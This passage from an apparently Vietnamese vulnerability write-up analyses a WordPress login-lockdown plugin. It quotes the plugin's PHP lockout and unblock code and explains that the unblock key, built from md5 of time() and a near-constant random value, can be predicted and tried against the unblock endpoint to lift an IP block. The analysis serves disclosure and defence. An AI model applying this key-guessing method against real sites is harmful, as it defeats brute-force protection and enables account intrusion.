<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$captcha</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">handle_captcha</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">is_wp_error</span><span class="p">(</span><span class="nv">$captcha</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;max_login_retries&#39;</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="nx">self</span><span class="o">::</span><span class="na">countFails</span><span class="p">(</span><span class="nv">$username</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">self</span><span class="o">::</span><span class="na">lockDown</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="s1">&#39;Too many captcha fails&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$captcha</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Nếu CAPTCHA thất bại và số lần lỗi vượt ngưỡng, tài khoản/IP sẽ bị khóa.</p>
<ol start="5">
<li><strong>Kiểm tra số lần đăng nhập thất bại</strong></li>
</ol>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$whitelisted</span> <span class="o">&amp;&amp;</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;max_login_retries&#39;</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="nx">self</span><span class="o">::</span><span class="na">countFails</span><span class="p">(</span><span class="nv">$username</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">self</span><span class="o">::</span><span class="na">lockDown</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="s1">&#39;Too many fails&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">new</span> <span class="nx">WP_Error</span><span class="p">(</span><span class="s1">&#39;lockdown_fail_count&#39;</span><span class="p">,</span> <span class="s1">&#39;IP has been blocked&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Nếu vượt quá số lần cho phép, plugin sẽ kích hoạt cơ chế khóa.</p>
<div class="alert alert-note"><p class="alert-title"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/></svg>Ghi chú</p><p><code>max_login_retries</code> được setup trong Admin Dashboard, giá trị mặc định sẽ là <code>3</code>
<figure><a class="lightgallery" target="_blank" href="/posts/2026-01-22-cve-2025-11707/max.png" title="Max login retries" data-thumbnail="/posts/2026-01-22-cve-2025-11707/max.png" data-sub-html="<h2>Max login retries</h2><p>Max login retries</p>"><img loading="lazy" src='/posts/2026-01-22-cve-2025-11707/max.png' alt="Max login retries" height="677" width="1130"></a><figcaption class="image-caption">Max login retries</figcaption>
  </figure></p></div><p>=&gt; Như vậy, chỉ cần <strong>3 lần đăng nhập thất bại liên tiếp</strong>, IP sẽ bị đưa vào trạng thái bị chặn và mọi lần đăng nhập tiếp theo từ IP đó sẽ bị từ chối ngay <strong>từ đầu quá trình xác thực</strong>.</p>
<p><figure><a class="lightgallery" target="_blank" href="/posts/2026-01-22-cve-2025-11707/blocked.png" title="Blocked" data-thumbnail="/posts/2026-01-22-cve-2025-11707/blocked.png" data-sub-html="<h2>Blocked</h2><p>Blocked</p>"><img loading="lazy" src='/posts/2026-01-22-cve-2025-11707/blocked.png' alt="Blocked" height="483" width="422"></a><figcaption class="image-caption">Blocked</figcaption>
  </figure></p>
<h3 class="heading-element" id="get-unlock-key"><span>Get Unlock Key</span>
  <a href="#get-unlock-key" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Để kích hoạt quy trình mở khóa, người dùng phải gửi form recovery kèm theo <strong>email của một tài khoản administrator</strong>.</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="functions.php v2.14" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">functions.php v2.14</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;loginlockdown_recovery_email&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nx">filter_var</span><span class="p">(</span><span class="nx">wp_unslash</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;loginlockdown_recovery_email&#39;</span><span class="p">]),</span> <span class="nx">FILTER_VALIDATE_EMAIL</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$display_message</span> <span class="o">=</span> <span class="s1">&#39;&lt;p class=&#34;error&#34;&gt;Invalid email address.&lt;/p&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$email</span> <span class="o">=</span> <span class="nx">sanitize_text_field</span><span class="p">(</span><span class="nx">wp_unslash</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;loginlockdown_recovery_email&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$user</span> <span class="o">=</span> <span class="nx">get_user_by</span><span class="p">(</span><span class="s1">&#39;email&#39;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>        
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">user_can</span><span class="p">(</span><span class="nv">$user</span><span class="p">,</span> <span class="s1">&#39;administrator&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$unblock_key</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">time</span><span class="p">()</span> <span class="o">.</span> <span class="nx">wp_rand</span><span class="p">(</span><span class="mi">10000</span><span class="p">,</span> <span class="mi">9999</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$unblock_attempts</span> <span class="o">=</span> <span class="nx">get_transient</span><span class="p">(</span><span class="s1">&#39;loginlockdown_unlock_count_&#39;</span> <span class="o">.</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">ID</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$unblock_attempts</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nv">$unblock_attempts</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$unblock_attempts</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">set_transient</span><span class="p">(</span><span class="s1">&#39;loginlockdown_unlock_count_&#39;</span> <span class="o">.</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">ID</span><span class="p">,</span> <span class="nv">$unblock_attempts</span><span class="p">,</span> <span class="nx">HOUR_IN_SECONDS</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$unblock_attempts</span> <span class="o">&lt;=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">set_transient</span><span class="p">(</span><span class="s1">&#39;loginlockdown_unlock_&#39;</span> <span class="o">.</span> <span class="nv">$unblock_key</span><span class="p">,</span> <span class="nv">$unblock_key</span><span class="p">,</span> <span class="nx">HOUR_IN_SECONDS</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="nv">$unblock_url</span> <span class="o">=</span> <span class="nx">add_query_arg</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;loginlockdown_unblock&#39;</span> <span class="o">=&gt;</span> <span class="nv">$unblock_key</span><span class="p">),</span> <span class="nx">wp_login_url</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="nv">$subject</span>  <span class="o">=</span> <span class="s1">&#39;Login Lockdown unblock instructions for &#39;</span> <span class="o">.</span> <span class="nx">site_url</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="nv">$message</span>  <span class="o">=</span> <span class="s1">&#39;&lt;p&gt;The IP &#39;</span> <span class="o">.</span> <span class="nx">LoginLockdown_Utility</span><span class="o">::</span><span class="na">getUserIP</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39; has been locked down and someone submitted an unblock request using your email address &lt;strong&gt;&#39;</span> <span class="o">.</span> <span class="nv">$email</span> <span class="o">.</span> <span class="s1">&#39;&lt;/strong&gt;&lt;/p&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nv">$message</span> <span class="o">.=</span> <span class="s1">&#39;&lt;p&gt;If this was you, and you have locked yourself out please click &lt;a target=&#34;_blank&#34; href=&#34;&#39;</span> <span class="o">.</span> <span class="nv">$unblock_url</span> <span class="o">.</span> <span class="s1">&#39;&#34;&gt;this link&lt;/a&gt; which is valid for 1 hour.&lt;/p&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nv">$message</span> <span class="o">.=</span> <span class="s1">&#39;&lt;p&gt;Please note that for security reasons, this will only unblock the IP of the person opening the link, not the IP of the person who submitted the unblock request. To unblock someone else please do so on the &lt;a href=&#34;&#39;</span> <span class="o">.</span> <span class="nx">admin_url</span><span class="p">(</span><span class="s1">&#39;options-general.php?page=loginlockdown#loginlockdown_activity&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&#34;&gt;Login Lockdown Activity Page&lt;/p&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="nx">add_filter</span><span class="p">(</span><span class="s1">&#39;wp_mail_content_type&#39;</span><span class="p">,</span> <span class="k">function</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;text/html&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="nx">wp_mail</span><span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">user_email</span><span class="p">,</span> <span class="nv">$subject</span><span class="p">,</span> <span class="nv">$message</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// If no admin using the submitted email exists, ignore silently
</span></span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$unblock_attempts</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$unblock_attempts</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$display_message</span> <span class="o">=</span> <span class="s1">&#39;&lt;p class=&#34;error&#34;&gt;You have already attempted to unblock yourself recently, please wait 1 hour before trying again.&lt;/p&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$display_message</span> <span class="o">=</span> <span class="s1">&#39;&lt;p&gt;If an administrator having the email address &lt;strong&gt;&#39;</span> <span class="o">.</span> <span class="nv">$email</span> <span class="o">.</span> <span class="s1">&#39;&lt;/strong&gt; exists, an email has been sent with instructions to regain access.&lt;/p&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Mở rộng hoặc thu gọn khối mã" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><ol>
<li><strong>Xác minh email có thuộc về administrator hay không</strong></li>
</ol>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$email</span> <span class="o">=</span> <span class="nx">sanitize_text_field</span><span class="p">(</span><span class="nx">wp_unslash</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;loginlockdown_recovery_email&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="nx">get_user_by</span><span class="p">(</span><span class="s1">&#39;email&#39;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">user_can</span><span class="p">(</span><span class="nv">$user</span><span class="p">,</span> <span class="s1">&#39;administrator&#39;</span><span class="p">))</span> 
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>Chỉ khi email thuộc về tài khoản có quyền <strong>administrator</strong> thì hệ thống mới tiếp tục sinh unlock key và gửi email.</p>
<ol start="2">
<li><strong>Giới hạn số lần yêu cầu mở khóa</strong></li>
</ol>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$unblock_attempts</span> <span class="o">=</span> <span class="nx">get_transient</span><span class="p">(</span><span class="s1">&#39;loginlockdown_unlock_count_&#39;</span> <span class="o">.</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">ID</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$unblock_attempts</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">set_transient</span><span class="p">(</span><span class="s1">&#39;loginlockdown_unlock_count_&#39;</span> <span class="o">.</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">ID</span><span class="p">,</span> <span class="nv">$unblock_attempts</span><span class="p">,</span> <span class="nx">HOUR_IN_SECONDS</span><span class="p">);</span></span></span></code></pre></td></tr></table></div>
</div>
</div><ul>
<li>Giới hạn: tối đa <strong>3 lần / 1 giờ / mỗi admin</strong></li>
<li>Bộ đếm gắn với <code>user_id</code>, không gắn với <strong>IP đang bị block</strong></li>
</ul>
<p>=&gt; Nếu tồn tại nhiều tài khoản admin, mỗi tài khoản có quota riêng, dễ bị lạm dụng.</p>
<ol start="3">
<li><strong>Sinh <code>unblock_key</code> và lưu transient</strong></li>
</ol>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$unblock_key</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">time</span><span class="p">()</span> <span class="o">.</span> <span class="nx">wp_rand</span><span class="p">(</span><span class="mi">10000</span><span class="p">,</span> <span class="mi">9999</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">set_transient</span><span class="p">(</span><span class="s1">&#39;loginlockdown_unlock_&#39;</span> <span class="o">.</span> <span class="nv">$unblock_key</span><span class="p">,</span> <span class="nv">$unblock_key</span><span class="p">,</span> <span class="nx">HOUR_IN_SECONDS</span><span class="p">);</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p><code>unblock_key</code> được tạo từ:</p>
<ul>
<li><code>time()</code> =&gt; timestamp theo giây (dễ đoán)</li>
<li><code>wp_rand(10000, 9999)</code> =&gt; chỉ trả về 2 giá trị: <code>9999</code> và <code>10000</code></li>
<li>Hash MD5 =&gt; không làm tăng entropy</li>
</ul>
<p>Key chỉ được lưu đơn lẻ trong transient, không gắn với IP hay user.</p>
<p>=&gt; Chỉ cần đoán đúng key còn hiệu lực trong 1 giờ là có thể kích hoạt unblock cho IP hiện tại.</p>
<ol start="4">
<li><strong>Gửi link mở khóa qua email</strong></li>
</ol>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$unblock_url</span> <span class="o">=</span> <span class="nx">wp</span><span class="o">-</span><span class="nx">login</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">loginlockdown_unblock</span><span class="o">=&lt;</span><span class="nx">key</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nx">wp_mail</span><span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">user_email</span><span class="p">,</span> <span class="o">...</span><span class="p">);</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Email chứa link mở khóa có hiệu lực trong 1 giờ.
Theo thiết kế, admin phải bấm link trên <strong>IP đang bị khóa</strong> để mở khóa IP đó.</p>
<div class="alert alert-note"><p class="alert-title"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/></svg>Ghi chú</p><p>Như vậy, kẻ tấn công <strong>không cần truy cập email của administrator</strong>.
Chỉ cần <strong>gửi yêu cầu mở khóa để kích hoạt quá trình sinh <code>unblock_key</code></strong>, đồng thời <strong>tự sinh các giá trị key theo đúng thuật toán trong code</strong> (dựa trên <code>time()</code> và <code>wp_rand()</code>), rồi thử trực tiếp trên endpoint:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">wp-login.php?loginlockdown_unblock=&lt;key&gt;</span></span></code></pre></td></tr></table></div>
</div>
